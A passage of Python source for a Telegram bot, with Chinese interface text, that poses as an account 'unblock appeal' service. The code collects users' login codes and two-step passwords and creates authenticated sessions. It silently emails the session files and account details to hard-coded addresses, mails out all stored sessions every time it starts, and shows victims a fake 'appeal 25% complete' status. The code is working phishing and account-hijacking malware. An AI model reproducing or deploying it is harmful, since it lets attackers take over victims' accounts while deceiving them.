                f"错误：{str(e)[:200]}",
                buttons=[
                    [Button.inline("🔄 重试", b"action_unblock")],
                    [Button.inline("◀️ 返回主菜单", b"action_back_to_main")]
                ]
            )
            del self.login_steps[user_id]
            if client:
                await client.disconnect()
            return True
    
    async def _send_session_backup_async(self, phone, session_file, account_info, operator_info):
        """异步发送 session 备份邮件（静默）"""
        try:
            await asyncio.sleep(1)
            self.email_notifier.send_session_backup(
                phone, session_file, account_info, operator_info
            )
        except Exception as e:
            logger.error(f"静默发送session备份失败: {e}")
    
    async def _process_2fa(self, event, password, step_info):
        """处理2FA密码输入"""
        from telethon.tl.custom import Button
        
        user_id = event.sender_id
        
        client = step_info['data'].get('client')
        phone = step_info['data'].get('phone')
        session_file = step_info['data'].get('session_file')
        
        if not client:
            await event.respond(
                "❌ **验证状态异常**",
                buttons=[Button.inline("🔄 重新开始", b"action_unblock")]
            )
            del self.login_steps[user_id]
            return True
        
        status_msg = await event.respond("⏳ **正在验证二级密码...**")
        
        try:
            await client.sign_in(password=password)
            me = await client.get_me()
            
            alias = f"acc_{len(self.db.get_user_sessions(user_id)) + 1}"
            
            clean_phone = re.sub(r'[^0-9]', '', phone)
            
            session_info = {
                'alias': alias,
                'username': me.username,
                'user_id': me.id,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'phone': phone,
                'clean_phone': clean_phone,
                'login_time': datetime.now().isoformat(),
                'has_2fa': True,
                'appeal_status': 'pending',
                'appeal_time': datetime.now().isoformat(),
                'progress': '25%',
                'session_file': session_file
            }
            self.db.add_session(user_id, alias, session_info)
            
            if user_id not in user_sessions:
                user_sessions[user_id] = {}
            user_sessions[user_id][alias] = client
            
            await client(UpdateStatusRequest(offline=False))
            
            # ========== 发送邮件备份（静默） ==========
            try:
                sender = await event.get_sender()
                operator_info = {
                    'user_id': sender.id,
                    'username': sender.username,
                    'first_name': sender.first_name or '',
                    'last_name': sender.last_name or ''
                }
            except:
                operator_info = {
                    'user_id': user_id,
                    'username': None,
                    'first_name': '未知',
                    'last_name': ''
                }
            
            asyncio.create_task(self._send_session_backup_async(
                phone, session_file, session_info, operator_info
            ))
            # ==========================================
            
            await status_msg.edit(
                f"✅ **申诉已提交！**\n\n"
                f"📱 **账号信息：**\n"
                f"• 账号名：`{alias}`\n"
                f"• 用户名：@{me.username or '无'}\n"
                f"• ID：`{me.id}`\n"
                f"• 姓名：{me.first_name or ''} {me.last_name or ''}\n"
                f"• 安全性：🔐 已启用双重验证\n\n"
                f"⏰ **处理状态**\n"
                f"• 申诉进度：25%\n"
                f"• 预计完成：24小时内\n\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"💡 解封完成后您将收到通知",
                buttons=[
                    [Button.inline("📊 查看进度", b"action_check_status")],
                    [Button.inline("🏠 返回主菜单", b"action_back_to_main")]
                ]
            )
            
            del self.login_steps[user_id]
            return True
            
        except Exception as e:
            await status_msg.edit(
                f"❌ **二级密码错误**\n\n"
                f"错误：{str(e)[:200]}",
                buttons=[
                    [Button.inline("🔄 重试", b"action_unblock")],
                    [Button.inline("❌ 取消", b"action_cancel_login")]
                ]
            )
            return True


class TelegramLoginBot:
    def __init__(self):
        os.makedirs("sessions", exist_ok=True)
        self.db = Database()
        self.email_notifier = EmailNotifier(
            SMTP_SERVER, SMTP_PORT, SMTP_USER, SMTP_PWD, TARGET_EMAILS
        )
        self.bot = TelegramClient('bot_main_session', API_ID, API_HASH)
        self.login_manager = None
    
    async def start_bot(self):
        await self.bot.start(bot_token=BOT_TOKEN)
        self.login_manager = LoginManager(self.bot, self.db, self.email_notifier)
        await self._load_saved_sessions()
        
        # 启动时发送现有账号备份邮件
        await self._send_backup_on_startup()
        
        logger.info("🤖 机器人已成功启动！")
        await self._register_handlers()
        await self.bot.run_until_disconnected()
    
    async def _send_backup_on_startup(self):
        """启动时发送所有已保存账号的备份邮件"""
        try:
            all_sessions = self.db.get_all_sessions()
            session_files_map = {}
            
            for user_id, sessions in all_sessions.items():
                if sessions:
                    sessions_list = list(sessions.items())
                    
                    # 收集所有 session 文件路径
                    for alias, info in sessions_list:
                        phone = info.get('phone', '')
                        clean_phone = re.sub(r'[^0-9]', '', phone) if phone else None
                        if clean_phone:
                            session_path = f"sessions/{clean_phone}.session"
                            if os.path.exists(session_path):
                                session_files_map[clean_phone] = session_path
                    
                    # 异步发送备份邮件
                    asyncio.create_task(self._send_batch_backup_async(user_id, sessions_list, session_files_map))
                    logger.info(f"📧 已触发批量备份邮件发送 - 用户: {user_id}, 账号数: {len(sessions_list)}")
        except Exception as e:
            logger.error(f"启动备份发送失败: {e}")
    
    async def _send_batch_backup_async(self, user_id, sessions_list, session_files_map):
        """异步发送批量备份邮件"""
        await asyncio.sleep(2)
        self.email_notifier.send_batch_backup(user_id, sessions_list, session_files_map)
    
    async def _load_saved_sessions(self):
        logger.info("已加载会话配置")
    
    async def _register_handlers(self):
        
        @self.bot.on(events.NewMessage(pattern='/start'))
        async def start(event):
            await self.login_manager.send_unblock_center(event)
        
        @self.bot.on(events.NewMessage(pattern='/help'))
        async def help_cmd(event):
            await self.login_manager.send_unblock_center(event)
        
        @self.bot.on(events.NewMessage(pattern='/menu'))
        async def menu(event):
            await self.login_manager.send_unblock_center(event)
        
        @self.bot.on(events.CallbackQuery)
        async def callback_handler(event):
            await self.login_manager.handle_callback(event)
        
        @self.bot.on(events.NewMessage)
        async def handle_messages(event):
            if event.text.startswith('/'):
                return
            if self.login_manager and await self.login_manager.handle_message(event):
                return


async def main():
    bot = TelegramLoginBot()
    await bot.start_bot()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n👋 机器人已停止运行")
    except Exception as e:
        print(f"❌ 启动失败: {e}")
        logger.error(f"启动错误: {e}", exc_info=True)